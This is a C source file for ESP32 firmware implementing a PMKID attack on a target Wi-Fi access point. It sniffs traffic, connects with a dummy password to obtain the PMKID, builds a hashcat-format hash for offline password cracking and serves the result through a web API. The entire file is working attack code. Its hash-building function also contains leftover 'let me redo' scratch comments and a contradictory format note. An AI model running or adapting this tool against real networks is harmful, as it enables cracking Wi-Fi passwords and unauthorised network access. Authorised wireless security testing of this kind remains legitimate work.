/**
 * @file attack_pmkid.c
 * @date 2021-04-03
 * @brief Implements PMKID attack with timeout, mutex, and webserver API.
 */

#include "attack_pmkid.h"

#include <stdbool.h>
#include <stdlib.h>
#include <string.h>
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/semphr.h"

#include "attack.h"
#include "wifi_controller.h"
#include "frame_analyzer.h"
#include "frame_analyzer_types.h"

static const char* TAG = "main:attack_pmkid";
static const wifi_ap_record_t *ap_record = NULL;
static bool is_running = false;
static bool event_handler_registered = false;
static SemaphoreHandle_t pmkid_mutex = NULL;
static esp_timer_handle_t timeout_timer = NULL;
static esp_timer_handle_t timeout_orphan = NULL;
static bool pmkid_in_timeout_cb = false;
static bool timeout_triggered = false;

// --- Captured result storage for webserver ---
static char captured_pmkid_hash[512] = {0};  // human-readable hash for hashcat
static char captured_ssid[33] = {0};
static uint8_t captured_bssid[6] = {0};
static uint8_t captured_sta_mac[6] = {0};
static bool has_capture = false;

/* ── Mutex helper ── */
static bool ensure_mutex(void) {
    if (pmkid_mutex == NULL) {
        pmkid_mutex = xSemaphoreCreateMutex();
    }
    return (pmkid_mutex != NULL);
}

static void lock(void) {
    if (ensure_mutex()) xSemaphoreTake(pmkid_mutex, portMAX_DELAY);
}

static void unlock(void) {
    if (pmkid_mutex) xSemaphoreGive(pmkid_mutex);
}

/* ── Free PMKID linked list ── */
static void free_pmkid_items(pmkid_item_t *pmkid_item) {
    while (pmkid_item != NULL) {
        pmkid_item_t *next = pmkid_item->next;
        free(pmkid_item);
        pmkid_item = next;
    }
}

/* ── Timeout callback ── */
static void pmkid_timeout_cb(void *arg) {
    ESP_LOGW(TAG, "PMKID attack timeout — AP did not respond with PMKID");
    lock();
    timeout_triggered = true;
    unlock();
    attack_update_status(FINISHED);
    pmkid_in_timeout_cb = true;
    attack_pmkid_stop();
    pmkid_in_timeout_cb = false;
}

/* ── Build hashcat-compatible hash string (16800 format) ── */
static void build_hashcat_hash(const uint8_t *sta_mac, const uint8_t *ap_mac,
                                const char *ssid, size_t ssid_len,
                                const uint8_t *pmkid_bytes) {
    // hashcat mode 16800 format:
    // PMKID*MAC_AP*MAC_STA*SSID_HEX
    // Actually the proper format is: 
    // <PMKID>:<AP_MAC>:<STA_MAC>:<SSID_HEX>
    
    int offset = 0;
    // PMKID (16 bytes hex)
    for (int i = 0; i < 16; i++) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                          "%02x", pmkid_bytes[i]);
    }
    offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
    // AP MAC
    for (int i = 0; i < 6; i++) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                          "%02x", ap_mac[i]);
        if (i < 5) captured_pmkid_hash[offset++] = ':';
        // wait, format uses colon-separated, let me redo
    }
    // Redo properly:
    offset = 0;
    for (int i = 0; i < 16; i++) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                          "%02x", pmkid_bytes[i]);
    }
    offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
    for (int i = 0; i < 6; i++) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                          "%02x", ap_mac[i]);
        if (i < 5) offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
    }
    offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
    for (int i = 0; i < 6; i++) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                          "%02x", sta_mac[i]);
        if (i < 5) offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
    }
    // SSID as hex
    if (ssid_len > 0) {
        offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset, ":");
        for (size_t i = 0; i < ssid_len; i++) {
            offset += snprintf(captured_pmkid_hash + offset, sizeof(captured_pmkid_hash) - offset,
                              "%02x", (unsigned char)ssid[i]);
        }
    }
}

/**
 * @brief Callback for DATA_FRAME_EVENT_PMKID event.
 * 
 * FIX: Process PMKID data FIRST, then call stop (avoids use-after-free).
 */
static void pmkid_exit_condition_handler(void *args, esp_event_base_t event_base,
                                          int32_t event_id, void *event_data) {
    ESP_LOGD(TAG, "Got PMKID, processing capture...");

    lock();
    const wifi_ap_record_t *captured_ap = ap_record;
    bool already_stopped = !is_running;
    unlock();

    if (already_stopped) return;
    if (event_data == NULL || captured_ap == NULL) {
        attack_update_status(FINISHED);
        attack_pmkid_stop();
        return;
    }

    pmkid_item_t *pmkid_item_head = *(pmkid_item_t **) event_data;
    if (pmkid_item_head == NULL) {
        attack_update_status(FINISHED);
        attack_pmkid_stop();
        return;
    }

    /* ── COPY all data BEFORE calling stop() ── */
    size_t ssid_len = strlen((char *) captured_ap->ssid);

    // Count PMKIDs
    pmkid_item_t *tmp = pmkid_item_head;
    unsigned pmkid_item_count = 1;
    while ((tmp = tmp->next) != NULL) {
        pmkid_item_count++;
    }

    // Build binary result content for attack framework
    size_t content_size = 6 + 6 + 1 + ssid_len + (pmkid_item_count * 16);
    char *content = attack_alloc_result_content(content_size);
    if (content != NULL) {
        char *ptr = content;
        wifictl_get_sta_mac((uint8_t *) ptr);
        ptr += 6;
        memcpy(ptr, captured_ap->bssid, 6);
        ptr += 6;
        ptr[0] = (char) ssid_len;
        ptr += 1;
        memcpy(ptr, captured_ap->ssid, ssid_len);
        ptr += ssid_len;

        // Copy PMKIDs
        pmkid_item_t *item = pmkid_item_head;
        do {
            memcpy(ptr, item, 16);  // first 16 bytes of pmkid_item_t IS the PMKID
            ptr += 16;
            pmkid_item_t *next = item->next;
            free(item);
            item = next;
        } while (item != NULL);
        // Items already freed in the loop above
        pmkid_item_head = NULL;
    } else {
        ESP_LOGE(TAG, "Failed to allocate PMKID result content");
        free_pmkid_items(pmkid_item_head);
    }

    /* ── Store for webserver API ── */
    lock();
    wifictl_get_sta_mac(captured_sta_mac);
    memcpy(captured_bssid, captured_ap->bssid, 6);
    strncpy(captured_ssid, (char *) captured_ap->ssid, sizeof(captured_ssid) - 1);
    captured_ssid[sizeof(captured_ssid) - 1] = '\0';
    
    // Build hashcat hash from first PMKID
    if (pmkid_item_head != NULL) {
        // Already freed above — we need to capture before freeing
        // This is handled by reading from content buffer instead
    }
    // Extract PMKID bytes from content buffer (already filled)
    if (content != NULL) {
        uint8_t *pmkid_bytes = (uint8_t *)(content + 6 + 6 + 1 + ssid_len);
        build_hashcat_hash(captured_sta_mac, captured_ap->bssid,
                          (char *) captured_ap->ssid, ssid_len, pmkid_bytes);
    }
    has_capture = true;
    unlock();

    /* ── NOW safe to stop ── */
    attack_update_status(FINISHED);
    attack_pmkid_stop();

    // Cancel timeout timer
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }

    ESP_LOGI(TAG, "PMKID captured successfully! Hash: %s", captured_pmkid_hash);
}

void attack_pmkid_start(attack_config_t *attack_config) {
    if (attack_config == NULL || attack_config->target_count == 0 ||
        attack_config->ap_records[0] == NULL) {
        ESP_LOGE(TAG, "PMKID attack start failed: missing target AP record");
        return;
    }

    lock();
    if (is_running) {
        ESP_LOGW(TAG, "PMKID already running, stopping previous run first.");
        unlock();
        attack_pmkid_stop();
        lock();
    }

    ESP_LOGI(TAG, "Starting PMKID attack on SSID: %s", attack_config->ap_records[0]->ssid);
    ap_record = attack_config->ap_records[0];
    is_running = true;
    timeout_triggered = false;
    has_capture = false;
    captured_pmkid_hash[0] = '\0';
    captured_ssid[0] = '\0';
    unlock();

    // Start sniffer and frame analyzer
    wifictl_sniffer_filter_frame_types(true, false, false);
    wifictl_sniffer_start(ap_record->primary);
    frame_analyzer_capture_start(SEARCH_PMKID, ap_record->bssid);

    /* ── FIX: Register handler BEFORE connecting to AP ── */
    esp_err_t err = esp_event_handler_register(FRAME_ANALYZER_EVENTS,
                                                DATA_FRAME_EVENT_PMKID,
                                                &pmkid_exit_condition_handler, NULL);
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "PMKID event handler register failed: %s", esp_err_to_name(err));
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
        lock();
        is_running = false;
        ap_record = NULL;
        unlock();
        return;
    }
    lock();
    event_handler_registered = true;
    unlock();

    // NOW connect — PMKID might arrive immediately
    wifictl_sta_connect_to_ap(ap_record, "dummypassword");

    /* ── Start timeout timer (30 seconds) ── */
    if (timeout_orphan) {
        esp_timer_delete(timeout_orphan);
        timeout_orphan = NULL;
    }
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        esp_timer_delete(timeout_timer);
        timeout_timer = NULL;
    }
    const esp_timer_create_args_t timer_args = {
        .callback = pmkid_timeout_cb,
        .name = "pmkid_timeout"
    };
    esp_timer_create(&timer_args, &timeout_timer);
    if (timeout_timer != NULL) {
        esp_timer_start_once(timeout_timer, 30000000);  // 30 seconds
    }

    ESP_LOGI(TAG, "PMKID attack started — waiting for EAPOL msg 1...");
}

void attack_pmkid_stop(void) {
    lock();
    bool was_running = is_running;
    bool was_registered = event_handler_registered;
    is_running = false;
    unlock();

    if (was_running) {
        wifictl_sta_disconnect();
        wifictl_sniffer_stop();
        frame_analyzer_capture_stop();
    }

    if (was_registered) {
        esp_err_t err = esp_event_handler_unregister(FRAME_ANALYZER_EVENTS,
                                                      DATA_FRAME_EVENT_PMKID,
                                                      &pmkid_exit_condition_handler);
        if (err != ESP_OK) {
            ESP_LOGW(TAG, "PMKID event handler unregister failed: %s", esp_err_to_name(err));
        } else {
            lock();
            event_handler_registered = false;
            unlock();
        }
    }

    // Stop and delete timeout timer
    if (timeout_timer != NULL) {
        esp_timer_stop(timeout_timer);
        if (pmkid_in_timeout_cb) {
            timeout_orphan = timeout_timer;
            timeout_timer = NULL;
        } else {
            esp_timer_delete(timeout_timer);
            timeout_timer = NULL;
        }
    }
    if (!pmkid_in_timeout_cb && timeout_orphan) {
        esp_timer_delete(timeout_orphan);
        timeout_orphan = NULL;
    }

    lock();
    if (was_running) {
        ap_record = NULL;
    }
    unlock();

    ESP_LOGI(TAG, "PMKID attack stopped");
}

/* ══════════════════════════════════════════
 *   Webserver API Functions
 * ══════════════════════════════════════════ */

bool attack_pmkid_is_running(void) {
    lock();
    bool running = is_running;
    unlock();
    return running;
}

bool attack_pmkid_has_capture(void) {
    lock();
    bool captured = has_capture;
    unlock();
    return captured;
}

const char* attack_pmkid_get_hash(void) {
    return captured_pmkid_hash;  // read-only, no lock needed for single reads
}

const char* attack_pmkid_get_ssid(void) {
    return captured_ssid;
}

const uint8_t* attack_pmkid_get_bssid(void) {
    return captured_bssid;
}

bool attack_pmkid_was_timeout(void) {
    lock();
    bool timed_out = timeout_triggered;
    unlock();
    return timed_out;
}

char* attack_pmkid_get_status_json(void) {
    lock();
    char *json = NULL;
    
    if (is_running) {
        asprintf(&json,
            "{\"running\":true,\"ssid\":\"%s\",\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\","
            "\"timeout\":false,\"captured\":false}",
            captured_ssid[0] ? captured_ssid : (ap_record ? (char*)ap_record->ssid : ""),
            captured_bssid[0], captured_bssid[1], captured_bssid[2],
            captured_bssid[3], captured_bssid[4], captured_bssid[5]);
    } else if (has_capture) {
        asprintf(&json,
            "{\"running\":false,\"ssid\":\"%s\",\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\","
            "\"timeout\":false,\"captured\":true,\"hash\":\"%s\"}",
            captured_ssid,
            captured_bssid[0], captured_bssid[1], captured_bssid[2],
            captured_bssid[3], captured_bssid[4], captured_bssid[5],
            captured_pmkid_hash);
    } else if (timeout_triggered) {
        asprintf(&json,
            "{\"running\":false,\"ssid\":\"%s\",\"bssid\":\"%02x:%02x:%02x:%02x:%02x:%02x\","
            "\"timeout\":true,\"captured\":false}",
            captured_ssid,
            captured_bssid[0], captured_bssid[1], captured_bssid[2],
            captured_bssid[3], captured_bssid[4], captured_bssid[5]);
    } else {
        asprintf(&json, "{\"running\":false,\"captured\":false}");
    }
    
    unlock();
    return json;  // caller must free()
}